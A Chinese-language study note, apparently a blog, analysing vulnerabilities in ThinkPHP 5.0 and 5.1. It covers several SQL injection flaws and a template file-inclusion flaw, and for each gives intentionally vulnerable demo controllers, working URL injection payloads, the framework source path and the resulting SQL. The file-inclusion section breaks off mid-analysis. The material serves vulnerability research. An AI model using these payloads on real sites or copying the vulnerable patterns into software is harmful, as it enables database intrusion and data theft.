[ThinkPHP框架 5.0.x sql注入漏洞分析](https://xz.aliyun.com/t/2257)

[TP5漏洞分析SQL注入篇](https://hosch3n.github.io/2020/10/21/TP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90SQL%E6%B3%A8%E5%85%A5%E7%AF%87/)

[Mochazz/ThinkPHP-Vuln](https://github.com/Mochazz/ThinkPHP-Vuln)

# 路由解析

路由解析将URL地址解析到某个模块中的某个控制器下的某个方法

```
http://server/module/controller/action/param/value/
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204071412367.png)

```php
<?php
namespace app\index\controller;

class Index
{
    public function index()
    {
        return '<style type="text/css">*{ padding: 0; margin: 0; } .think_default_text{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style="padding: 24px 48px;"> <h1>:)</h1><p> ThinkPHP V5<br/><span style="font-size:30px">十年磨一剑 - 为API开发设计的高性能框架</span></p><span style="font-size:22px;">[ V5.0 版本由 <a href="http://www.qiniu.com" target="qiniu">七牛云</a> 独家赞助发布 ]</span></div><script type="text/javascript" src="http://tajs.qq.com/stats?sId=9347272" charset="UTF-8"></script><script type="text/javascript" src="http://ad.topthink.com/Public/static/client.js"></script><thinkad id="ad_bd568ce7058a1091"></thinkad>';
    }
}
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204071434033.png)

```php
<?php

namespace app\index\controller;

class Index
{
    public function index()
    {
        return "index";
    }

    public function hello($str = "world")
    {
        print("hello $str");
    }
}
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204071438229.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204071439472.png)

---

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204071449547.png)

```php
<?php

namespace app\hello\controller;

class Index
{
    public function index()
    {
        return "Hello";
    }
}
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204071450657.png)

---

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204071454426.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204071454881.png)

# 变量获取

[https://www.kancloud.cn/manual/thinkphp5/118044](https://www.kancloud.cn/manual/thinkphp5/118044)

>变量类型方法('变量名/变量修饰符','默认值','过滤方法')
>
>框架默认没有设置任何过滤规则

助手函数

```php
    /**
     * 获取输入数据 支持默认值和过滤
     * @param string    $key 获取的变量名
     * @param mixed     $default 默认值
     * @param string    $filter 过滤方法
     * @return mixed
     */
    function input($key = '', $default = null, $filter = '')
    {
        if (0 === strpos($key, '?')) {
            $key = substr($key, 1);
            $has = true;
        }
        if ($pos = strpos($key, '.')) {
            // 指定参数来源
            list($method, $key) = explode('.', $key, 2);
            if (!in_array($method, ['get', 'post', 'put', 'patch', 'delete', 'route', 'param', 'request', 'session', 'cookie', 'server', 'env', 'path', 'file'])) {
                $key    = $method . '.' . $key;
                $method = 'param';
            }
        } else {
            // 默认为自动判断
            $method = 'param';
        }
        if (isset($has)) {
            return request()->has($key, $method, $default);
        } else {
            return request()->$method($key, $default, $filter);
        }
    }
```

```php
<?php

namespace app\index\controller;

class Index
{
    public function index()
    {
        $a=input('get.id');
        var_dump($a);
        $get=input('get.');
        var_dump($get);
    }
}
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204071548200.png)

ThinkPHP5.0版本默认的变量修饰符是`/s`,如果需要传入字符串之外的变量可以使用下面的修饰符,包括

|修饰符|作用|
|:---:|:---:|
|s|强制转换为字符串类型|
|d|强制转换为整型类型|
|b|强制转换为布尔类型|
|a|强制转换为数组类型|
|f|强制转换为浮点类型|

>如果你要获取的数据为数组,请一定注意要加上`/a`修饰符才能正确获取到

# parseData导致sql注入(inc)

>测试版本为5.0.14

[ThinkPHP 5.0.14](http://www.thinkphp.cn/download/1107.html)

## 数据库配置

```
create table users(id int auto_increment primary key,username varchar(20),password varchar(30));
insert into users(username,password) values("user","password");
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204071559929.png)

`applicaion/database.php`

```php
<?php

return [
    // 数据库类型
    'type'            => 'mysql',
    // 服务器地址
    'hostname'        => '127.0.0.1',
    // 数据库名
    'database'        => 'thinkphp_v5',
    // 用户名
    'username'        => 'thinkphp_v5',
    // 密码
    'password'        => 'thinkphp_v5',
    // 端口
    'hostport'        => '3306',
```

同时在`application/config.php`中开启`debug`模式(`'app_debug' => true`),否则报错注入没有回显

## 漏洞复现

```php
<?php
namespace app\index\controller;
use think\Db;

class Index
{
    public function index()
    {
        $username = input('get.username/a');
        Db::table("users")->where(["id"=>1])->insert(["username"=>$username]);
    }
}
```

`index.php?username[0]=inc&username[1]=updatexml(1,concat(0x7e,user(),0x7e),1)&username[2]=1`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204071635736.png)

## 漏洞分析

```php
#thinkphp/library/think/db/Query.php
    /**
     * 插入记录
     * @access public
     * @param mixed   $data         数据
     * @param boolean $replace      是否replace
     * @param boolean $getLastInsID 返回自增主键
     * @param string  $sequence     自增序列名
     * @return integer|string
     */
    public function insert(array $data = [], $replace = false, $getLastInsID = false, $sequence = null)
    {
        // 分析查询表达式
        $options = $this->parseExpress();//分析表达式
        $data    = array_merge($options['data'], $data);
        // 生成SQL语句
        $sql = $this->builder->insert($data, $options, $replace);
        // 获取参数绑定
        $bind = $this->getBind();
        if ($options['fetch_sql']) {
            // 获取实际执行的SQL语句
            return $this->connection->getRealSql($sql, $bind);
        }

        // 执行操作
        $result = 0 === $sql ? 0 : $this->execute($sql, $bind);
        ...
    }
```

```php
#thinkphp/library/think/db/Builder.php
    /**
     * 生成insert SQL
     * @access public
     * @param array     $data 数据
     * @param array     $options 表达式
     * @param bool      $replace 是否replace
     * @return string
     */
    public function insert(array $data, $options = [], $replace = false)
    {
        // 分析并处理数据
        $data = $this->parseData($data, $options);
        if (empty($data)) {
            return 0;
        }
        $fields = array_keys($data);
        $values = array_values($data);

        $sql = str_replace(
            ['%INSERT%', '%TABLE%', '%FIELD%', '%DATA%', '%COMMENT%'],
            [
                $replace ? 'REPLACE' : 'INSERT',
                $this->parseTable($options['table'], $options),
                implode(' , ', $fields),
                implode(' , ', $values),
                $this->parseComment($options['comment']),
            ], $this->insertSql);

        return $sql;
    }

    /**
     * 数据分析
     * @access protected
     * @param array     $data 数据
     * @param array     $options 查询参数
     * @return array
     * @throws Exception
     */
    protected function parseData($data, $options)
    {
        if (empty($data)) {
            return [];
        }

        // 获取绑定信息
        $bind = $this->query->getFieldsBind($options['table']);
        if ('*' == $options['field']) {
            $fields = array_keys($bind);
        } else {
            $fields = $options['field'];
        }

        $result = [];
        foreach ($data as $key => $val) {
            $item = $this->parseKey($key, $options);#字段和表名处理 对payload利用没有实际影响
            ...
            if (false === strpos($key, '.') && !in_array($key, $fields, true)) {
                ...
            } elseif (is_null($val)) {
                $result[$item] = 'NULL';
            } elseif (is_array($val) && !empty($val)) {
                switch ($val[0]) {#关键点
                    case 'exp':
                        $result[$item] = $val[1];
                        break;
                    case 'inc':
                        $result[$item] = $this->parseKey($val[1]) . '+' . floatval($val[2]);
                        #result[`username`]=updatexml(1,concat(0x7e,user(),0x7e),1)+1
                        break;
                    case 'dec':
                        $result[$item] = $this->parseKey($val[1]) . '-' . floatval($val[2]);
                        break;
                }
            }
            ...
        }
        return $result;
    }
```

最终执行的sql语句为

```
INSERT INTO `users` (`username`) VALUES (updatexml(1,concat(0x7e,user(),0x7e),1)+1)
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204071901818.png)

>添加`username[2]=1`的原因

语句拼接时用到了`floatval($val[2])`,因此需要设置`username[2]`

>不使用`exp`的原因

前面在`input`处理时给`exp`后面加了个空格,类似于thinkphp_v3的处理方式

```php
#thinkphp/library/think/Request.php
    /**
     * 过滤表单中的表达式
     * @param string $value
     * @return void
     */
    public function filterExp(&$value)
    {
        // 过滤查询特殊字符
        if (is_string($value) && preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT LIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i', $value)) {
            $value .= ' ';
        }
        // TODO 其他安全过滤
    }
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204071917159.png)

>不使用`concat(0x7e,(select user()),0x7e)`的原因

会报错`SQLSTATE[HY000]: General error: 1105 Only constant XPATH queries are supported`

可以用其他报错方式来带出数据,取决于数据库版本

`index.php?username[0]=inc&username[1]=ST_LongFromGeoHash((select*from(select*from(select @@version)x)y))&username[2]=1`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204072029966.png)

# parseArrayData导致sql注入(point)

>测试版本为5.1.6

## 漏洞复现

```php
<?php
namespace app\index\controller;
use think\Db;

class Index
{
    public function index()
    {
        $username = input('get.username/a');
        Db::table("users")->where(["id"=>1])->insert(["username"=>$username]);
    }
}
```

`index.php?username[0]=point&username[1]=a&username[2]='b' and updatexml(1,concat(0x7e,user(),0x7e),1))--+`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204092348625.png)

## 漏洞分析

主要是`parseData`的处理方式跟前面的`5.0.14`版本不一样

```php
#thinkphp/library/think/db/Builder.php
    /**
     * 数据分析
     * @access protected
     * @param  Query     $query     查询对象
     * @param  array     $data      数据
     * @param  array     $fields    字段信息
     * @param  array     $bind      参数绑定
     * @param  string    $suffix    参数绑定后缀
     * @return array
     */
    protected function parseData(Query $query, $data = [], $fields = [], $bind = [], $suffix = '')
    {
        ...

        $result = [];

        foreach ($data as $key => $val) {
            $item = $this->parseKey($query, $key);#return $key;

           ...

            if (false !== strpos($key, '->')) {
                list($key, $name) = explode('->', $key);
                $item             = $this->parseKey($query, $key);
                $result[$item]    = 'json_set(' . $item . ', \'$.' . $name . '\', ' . $this->parseDataBind($query, $key, $val, $bind, $suffix) . ')';
            } elseif (false === strpos($key, '.') && !in_array($key, $fields, true)) {
                if ($options['strict']) {
                    throw new Exception('fields not exists:[' . $key . ']');
                }
            } elseif (is_null($val)) {
                $result[$item] = 'NULL';
            } elseif (is_array($val) && !empty($val)) {
                switch ($val[0]) {
                    case 'INC':
                        $result[$item] = $item . ' + ' . floatval($val[1]);
                        break;
                    case 'DEC':
                        $result[$item] = $item . ' - ' . floatval($val[1]);
                        break;
                    default:
                        $value = $this->parseArrayData($query, $val);#关键点
                        if ($value) {
                            $result[$item] = $value;
                        }
                }
            } elseif (is_scalar($val)) {
                // 过滤非标量数据
                $result[$item] = $this->parseDataBind($query, $key, $val, $bind, $suffix);
            }
        }

        return $result;
    }

#thinkphp/library/think/db/builder/Mysql.php
    /**
     * 数组数据解析
     * @access protected
     * @param  Query     $query     查询对象
     * @param  array     $data
     * @return mixed
     */
    protected function parseArrayData(Query $query, $data)
    {
        list($type, $value) = $data;#$type=$data[0],$value=$data[1]

        switch (strtolower($type)) {#当type(即$data[1])为point时,$result由$fun(即$data[2]),$point(即$data[3]),$value(即$data[1])构成
            case 'point':
                $fun   = isset($data[2]) ? $data[2] : 'GeomFromText';
                $point = isset($data[3]) ? $data[3] : 'POINT';
                if (is_array($value)) {
                    $value = implode(' ', $value);
                }
                $result = $fun . '(\'' . $point . '(' . $value . ')\')';
                break;
            default:
                $result = false;
        }

        return $result;
    }
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204101417411.png)

最终得到的result为`'b' and updatexml(1,concat(0x7e,user(),0x7e),1))-- ('POINT(a)')`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204101419689.png)

最终执行的sql语句为

```
INSERT INTO `users` (`username`) VALUES ('b' and updatexml(1,concat(0x7e,user(),0x7e),1))-- ('POINT(a)')) 
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204101422994.png)

>除了使用`insert`方法外,还可以使用`insertAll`和`update`方法

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204101427347.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204101427972.png)

# parseWhereItem导致sql注入(not like)

>测试版本为5.0.10

## 漏洞复现

```php
<?php
namespace app\index\controller;
use think\Db;

class Index
{
    public function index()
    {
        $username = input('get.username/a');
        $result=Db::table("users")->where(['username' => $username])->select();
        var_dump($result);
    }
}
```

`?username[0]=not like&username[1][0]=asdf&username[1][1]=asdf&username[2]=) union select 1,user(),3--+`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204101953596.png)

## 漏洞分析

函数调用栈

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204101958003.png)

```php
#thinkphp/library/think/db/Builder.php
    // where子单元分析
    protected function parseWhereItem($field, $val, $rule = '', $options = [], $binds = [], $bindName = null)
    {
        // 字段分析
        $key = $field ? $this->parseKey($field, $options) : '';#return $key;

        // 查询规则和条件
        if (!is_array($val)) {
            $val = ['=', $val];
        }
        list($exp, $value) = $val;#$value为$val[1]

        ...

        // 检测操作符
        if (!in_array($exp, $this->exp)) {
            $exp = strtolower($exp);
            if (isset($this->exp[$exp])) {
                $exp = $this->exp[$exp];
            } else {
                throw new Exception('where express error:' . $exp);
            }
        }
        $bindName = $bindName ?: 'where_' . str_replace(['.', '-'], '_', $field);#$bindName="where_username"

        ...

        $whereStr = '';
        if (in_array($exp, ['=', '<>', '>', '>=', '<', '<='])) {
            ...
        } elseif ('LIKE' == $exp || 'NOT LIKE' == $exp) {
            // 模糊匹配
            if (is_array($value)) {#关键点
            #当$val[1]为array时进入foreach,此时$logic的值取决于$val[2]
            #因为$logic的值可被用户控制,由此造成sql注入
                foreach ($value as $item) {
                    $array[] = $key . ' ' . $exp . ' ' . $this->parseValue($item, $field);
                }
                $logic = isset($val[2]) ? $val[2] : 'AND';
                $whereStr .= '(' . implode($array, ' ' . strtoupper($logic) . ' ') . ')';
            } else {
                $whereStr .= $key . ' ' . $exp . ' ' . $this->parseValue($value, $field);
            }
        }
        ...
        return $whereStr;
    }

    /**
     * value分析
     * @access protected
     * @param mixed     $value
     * @param string    $field
     * @return string|array
     */
    protected function parseValue($value, $field = '')
    {
        if (is_string($value)) {
            $value = strpos($value, ':') === 0 && $this->query->isBind(substr($value, 1)) ? $value : $this->connection->quote($value);
        }
        #strpos($value, ':') === 0 为false,因此执行$this->connection->quote($value)
        ...
        return $value;
    }

#thinkphp/library/think/db/Connection.php
    /**
     * SQL指令安全过滤
     * @access public
     * @param string $str SQL字符串
     * @param bool   $master 是否主库查询
     * @return string
     */
    public function quote($str, $master = true)
    {
        $this->initConnect($master);
        return $this->linkID ? $this->linkID->quote($str) : $str;
        #https://www.php.net/manual/zh/pdo.quote.php
        #为输入的字符串添加引号（如果有需要），并对特殊字符进行转义
    }
```

由于存在`implode($array, ' ' . strtoupper($logic)`,因此对于`$array`的长度有要求

```php
<?php

$array[0]="asdf";
$logic="test";
$a=implode($array,' '.strtoupper($logic).' ');
var_dump($a);
```

```
string(4) "asdf"
```

```php
<?php

$array[0]="asdf";
$array[1]="asdf";
$logic="test";
$a=implode($array,' '.strtoupper($logic).' ');
var_dump($a);
```

```
string(14) "asdf TEST asdf"
```

>注意遗留写法与当前写法的区别

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204102024249.png)

---

原始输入为`username[0]=not like&username[1][0]=asdf&username[1][1]=asdf&username[2]=) union select 1,user(),3--+`

`parseWhereItem`中`$field`为`"username"`,`$val`为`username`数组

经过`list($exp, $value) = $val;`后得到`$exp="not like"`,`$value`为`username[1]`这一数组

经过操作符检测`$exp = $this->exp[$exp];`后`$exp`转化为`NOT LIKE`

在`NOT LIKE`的模糊匹配中,经过`foreach`后得到的`$array`为

```
1 = {} "`username` NOT LIKE 'asdf'"
0 = {} "`username` NOT LIKE 'asdf'"
```

`implode($array, ' ' . strtoupper($logic) . ' ')`后得到的字符串为

```
`username` NOT LIKE 'asdf' ) UNION SELECT 1,USER(),3--  `username` NOT LIKE 'asdf'
```

最终的查询语句为

```
SELECT * FROM `users` WHERE  (`username` NOT LIKE 'asdf' ) UNION SELECT 1,USER(),3--  `username` NOT LIKE 'asdf') 
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204102037271.png)

## 漏洞产生原因

```php
#thinkphp/library/think/Request.php
    /**
     * 过滤表单中的表达式
     * @param string $value
     * @return void
     */
    public function filterExp(&$value)
    {
        // 过滤查询特殊字符
        if (is_string($value) && preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i', $value)) {
            $value .= ' ';
        }
        // TODO 其他安全过滤
    }
```

可以看到在`filterExp`中仅对`NOTLIKE`进行了处理,没有处理`NOT LIKE`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204102043480.png)

# parseKey导致sql注入(parseOrder)

>测试版本为5.1.17

## 漏洞复现

```php
<?php
namespace app\index\controller;

class Index
{
    public function index()
    {
        $order = request()->get('order');
        $result = db('users')->where(['username' => 'user'])->order($order)->find();
        var_dump($result);
    }
}
```

```
?order[id` and updatexml(1,concat(0x7e,user(),0x7e),1)%23]=1
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204102145690.png)

## 漏洞分析

函数调用栈

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204102227636.png)

```php
#Query->find => Connection->find => Builder->select
#thinkphp/library/think/db/Builder.php
    /**
     * 生成查询SQL
     * @access public
     * @param  Query  $query  查询对象
     * @return string
     */
    public function select(Query $query)#Builder->select
    {
        $options = $query->getOptions();

        return str_replace(
            ['%TABLE%', '%DISTINCT%', '%FIELD%', '%JOIN%', '%WHERE%', '%GROUP%', '%HAVING%', '%ORDER%', '%LIMIT%', '%UNION%', '%LOCK%', '%COMMENT%', '%FORCE%'],
            [
                $this->parseTable($query, $options['table']),
                $this->parseDistinct($query, $options['distinct']),
                $this->parseField($query, $options['field']),
                $this->parseJoin($query, $options['join']),
                $this->parseWhere($query, $options['where']),
                $this->parseGroup($query, $options['group']),
                $this->parseHaving($query, $options['having']),
                $this->parseOrder($query, $options['order']),#关键点
                $this->parseLimit($query, $options['limit']),
                $this->parseUnion($query, $options['union']),
                $this->parseLock($query, $options['lock']),
                $this->parseComment($query, $options['comment']),
                $this->parseForce($query, $options['force']),
            ],
            $this->selectSql);
    }

    /**
     * order分析
     * @access protected
     * @param  Query     $query        查询对象
     * @param  mixed     $order
     * @return string
     */
    protected function parseOrder(Query $query, $order)
    {
        if (empty($order)) {
            return '';
        }

        $array = [];

        foreach ($order as $key => $val) {
            if ($val instanceof Expression) {
                ...
            } else {
                $array[] = $this->parseKey($query, $key, true) . $sort;#$sort=""
            }
        }

        return ' ORDER BY ' . implode(',', $array);
    }

#thinkphp/library/think/db/builder/Mysql.php
    /**
     * 字段和表名处理
     * @access public
     * @param  Query     $query 查询对象
     * @param  mixed     $key   字段名
     * @param  bool      $strict   严格检测
     * @return string
     */
    public function parseKey(Query $query, $key, $strict = false)
    {
        ...
        #$array[] = $this->parseKey($query, $key, true) . $sort;
        #$strict为true
        if ('*' != $key && ($strict || !preg_match('/[,\'\"\*\(\)`.\s]/', $key))) {
            $key = '`' . $key . '`';
            #$key=`id` and updatexml(1,concat(0x7e,user(),0x7e),1)#`
        }

        ...

        return $key;
    }
```

在parseOrder分析时的`$order`为

```
order[id` and updatexml(1,concat(0x7e,user(),0x7e),1)%23]=1
```

传递到`parseKey`中进行处理

```
$key=id` and updatexml(1,concat(0x7e,user(),0x7e),1)#
```

处理后得到

```
$key=`id` and updatexml(1,concat(0x7e,user(),0x7e),1)#`
```

生成的查询SQL为

```
SELECT * FROM `users` WHERE  `username` = :where_AND_username ORDER BY `id` and updatexml(1,concat(0x7e,user(),0x7e),1)#` LIMIT 1  
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204102225207.png)

最终的SQL语句为

```
SELECT * FROM `users` WHERE `username` = 'user' ORDER BY `id` and updatexml(1,concat(0x7e,user(),0x7e),1)-- ` LIMIT 1
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204102225852.png)

# parseKey导致sql注入(max查询)

>测试版本为5.1.25

## 漏洞复现

```php
<?php
namespace app\index\controller;

class Index
{
    public function index()
    {
        $options = request()->get('options');
        $result = db('users')->max($options);
        var_dump($result);
    }
}
```

```
?options=id`)and updatexml(1,concat(0x7e,version(),0x7e),1) from users%23
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204111454161.png)

## 漏洞分析

函数调用栈

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204111504332.png)

```php
#thinkphp/library/think/db/Query.php
    /**
     * MAX查询
     * @access public
     * @param  string $field    字段名
     * @param  bool   $force    强制转为数字类型
     * @return mixed
     */
    public function max($field, $force = true)
    {
        return $this->aggregate('MAX', $field, $force);
    }
    /**
     * 聚合查询
     * @access public
     * @param  string $aggregate    聚合方法
     * @param  string $field        字段名
     * @param  bool   $force        强制转为数字类型
     * @return mixed
     */
    public function aggregate($aggregate, $field, $force = false)
    {
        $this->parseOptions();

        $result = $this->connection->aggregate($this, $aggregate, $field);

        ...

        return $result;
    }

#thinkphp/library/think/db/Connection.php
    /**
     * 得到某个字段的值
     * @access public
     * @param  Query     $query     查询对象
     * @param  string    $aggregate 聚合方法
     * @param  string    $field     字段名
     * @return mixed
     */
    public function aggregate(Query $query, $aggregate, $field)
    {
        $field = $aggregate . '(' . $this->builder->parseKey($query, $field, true) . ') AS tp_' . strtolower($aggregate);
        #$field=MAX(`id`)and updatexml(1,concat(0x7e,version(),0x7e),1) from users#`) AS tp_max
        return $this->value($query, $field, 0);#执行查询并得到某个字段的值
    }

#thinkphp/library/think/db/builder/Mysql.php
    /**
     * 字段和表名处理
     * @access public
     * @param  Query     $query 查询对象
     * @param  mixed     $key   字段名
     * @param  bool      $strict   严格检测
     * @return string
     */
    public function parseKey(Query $query, $key, $strict = false)#$key=id`)and updatexml(1,concat(0x7e,version(),0x7e),1) from users#
    {
        if (is_numeric($key)) {
            return $key;
        } elseif ($key instanceof Expression) {
            return $key->getValue();
        }

        ...

        if ('*' != $key && ($strict || !preg_match('/[,\'\"\*\(\)`.\s]/', $key))) {
            $key = '`' . $key . '`';
        }

        return $key;#$key=`id`)and updatexml(1,concat(0x7e,version(),0x7e),1) from users#`
    }
```

从`Query->max`传递到`Query->aggregate`再传递到`Connection->aggregate`,通过`parseKey`对传入的`$options`进行处理

>类似于前面提到的5.1.17版本sql注入

处理后得到

```
$key=`id`)and updatexml(1,concat(0x7e,version(),0x7e),1) from users#`
```

返回到`Connection->aggregate`,`$field`进行拼接得到

```
$field=MAX(`id`)and updatexml(1,concat(0x7e,version(),0x7e),1) from users#`) AS tp_max
```

最终进行查询的sql为

```
SELECT MAX(`id`)and updatexml(1,concat(0x7e,version(),0x7e),1) from users#`) AS tp_max FROM `users` LIMIT 1  
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204111512808.png)

# exp注入(全版本影响)

>测试版本为5.0.10

## 漏洞复现

```php
<?php
namespace app\index\controller;

class Index
{
    public function index()
    {
        $username = request()->get('username');
        $result = db('users')->where('username','exp',$username)->select();
        var_dump($result);
    }
}
```

```
?username==1) and updatexml(1,concat(0x7e,user(),0x7e),1)%23
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204111736580.png)

## 漏洞分析

```php
#thinkphp/library/think/db/Query.php
    /**
     * 指定AND查询条件
     * @access public
     * @param mixed $field     查询字段
     * @param mixed $op        查询表达式
     * @param mixed $condition 查询条件
     * @return $this
     */
    public function where($field, $op = null, $condition = null)
    {
        $param = func_get_args();
        array_shift($param);
        #$param
        #0 = {} "exp"
        #1 = {} "=1) and updatexml(1,concat(0x7e,user(),0x7e),1)#"
        $this->parseWhereExp('AND', $field, $op, $condition, $param);
        return $this;
    }

    /**
     * 分析查询表达式
     * @access public
     * @param string                $logic     查询逻辑 and or xor
     * @param string|array|\Closure $field     查询字段
     * @param mixed                 $op        查询表达式
     * @param mixed                 $condition 查询条件
     * @param array                 $param     查询参数
     * @return void
     */
    protected function parseWhereExp($logic, $field, $op, $condition, $param = [])
    {
        #$condition = {} "=1) and updatexml(1,concat(0x7e,user(),0x7e),1)#"
        #$field = {} "username"
        #$logic = {} "AND"
        #$op = {} "exp"
        #$param = {数组} [2]
        # 0 = {} "exp"
        # 1 = {} "=1) and updatexml(1,concat(0x7e,user(),0x7e),1)#"
        $logic = strtoupper($logic);

        ...

        if (is_string($field) && preg_match('/[,=\>\<\'\"\(\s]/', $field)) {
            ...
        } else {
            $where[$field] = [$op, $condition, isset($param[2]) ? $param[2] : null];
            if ('exp' == strtolower($op) && isset($param[2]) && is_array($param[2])) {#$param[2]没有设置,因此不用进行参数绑定
                // 参数绑定
                $this->bind($param[2]);
            }
            // 记录一个字段多次查询条件
            $this->options['multi'][$logic][$field][] = $where[$field];#用户输入的参数没有经过过滤便赋值到$this->options中
        }
        if (!empty($where)) {
            if (!isset($this->options['where'][$logic])) {
                $this->options['where'][$logic] = [];
            }
            ...
            $this->options['where'][$logic] = array_merge($this->options['where'][$logic], $where);
        }
    }

#thinkphp/library/think/db/Builder.php
    // where子单元分析
    protected function parseWhereItem($field, $val, $rule = '', $options = [], $binds = [], $bindName = null)
    {
        $whereStr = '';
        if (in_array($exp, ['=', '<>', '>', '>=', '<', '<='])) {
            ...
        } elseif ('EXP' == $exp) {
            // 表达式查询
            $whereStr .= '( ' . $key . ' ' . $value . ' )';
        }
        return $whereStr;
    }
```

在`parseWhereItem`中完成`$this->options`拼接,并执行sql语句,最终执行的语句为

```
SELECT * FROM `users` WHERE  ( `username` =1) and updatexml(1,concat(0x7e,user(),0x7e),1)# ) 
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204112020497.png)

# 模板引擎文件包含漏洞

>测试版本为5.0.14

## 漏洞复现

```php
<?php
namespace app\index\controller;
use think\Controller;
class Index extends Controller
{
    public function index()
    {
        $a=request()->get();
        $this->assign($a);
        return $this->fetch();
    }
}
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204112215561.png)

添加`application/index/view/index/index.html`并随便写入一点内容

向`pulibc/upload/a.jpg`添加一个图片马,模拟文件上传

目录结构

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204112218378.png)

`?cacheFile=upload/a.jpg`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204112218376.png)

## 漏洞分析

函数调用栈

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204112227721.png)

```php
#thinkphp/library/think/Controller.php
    /**
     * 模板变量赋值
     * @access protected
     * @param  mixed $name  要显示的模板变量
     * @param  mixed $value 变量的值
     * @return $this
     */
    protected function assign($name, $value = '')#$name => $a['cacheFile']="upload/a.jpg"
    {
        $this->view->assign($name, $value);

        return $this;
    }

#thinkphp/library/think/View.php
    /**
     * 模板变量赋值
     * @access public
     * @param mixed $name  变量名
     * @param mixed $value 变量值
     * @return $this
     */
    public function assign($name, $value = '')
    {
        if (is_array($name)) {
            $this->data = array_merge($this->data, $name);#$this->data['cacheFile']="upload/a.jpg"
        } else {
            $this->data[$name] = $value;
        }
        return $this;
    }
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204112236292.png)

```php
#thinkphp/library/think/Controller.php
    /**
     * 加载模板输出
     * @access protected
     * @param  string $template 模板文件名
     * @param  array  $vars     模板输出变量
     * @param  array  $replace  模板替换
     * @param  array  $config   模板参数
     * @return mixed
     */
    protected function fetch($template = '', $vars = [], $replace = [], $config = [])
    {
        return $this->view->fetch($template, $vars, $replace, $config);
    }

#thinkphp/library/think/View.php
    /**
     * 解析和获取模板内容 用于输出
     * @param string    $template 模板文件名或者内容
     * @param array     $vars     模板输出变量
     * @param array     $replace 替换内容
     * @param array     $config     模板参数
     * @param bool      $renderContent     是否渲染内容
     * @return string
     * @throws Exception
     */
    public function fetch($template = '', $vars = [], $replace = [], $config = [], $renderContent = false)
    {
        // 模板变量
        $vars = array_merge(self::$var, $this->data, $vars);#$vars['cacheFile']="upload/a.jpg"

        ...

        // 渲染输出
        try {
            $method = $renderContent ? 'display' : 'fetch';
            // 允许用户自定义模板的字符串替换
            $replace = array_merge($this->replace, $replace, $this->engine->config('tpl_replace_string'));
            $this->engine->config('tpl_replace_string', $replace);
            $this->engine->$method($template, $vars, $config);#关键点
        } catch (\Exception $e) {
            ob_end_clean();
            throw $e;
        }
        ...
        return $content;
    }

#thinkphp/library/think/view/driver/Think.php
    /**
     * 渲染模板文件
     * @access public
     * @param string    $template 模板文件
     * @param array     $data 模板变量
     * @param array     $config 模板参数
     * @return void
     */
    public function fetch($template, $data = [], $config = [])
    {
        if ('' == pathinfo($template, PATHINFO_EXTENSION)) {
            // 获取模板文件名
            $template = $this->parseTemplate($template);
        }
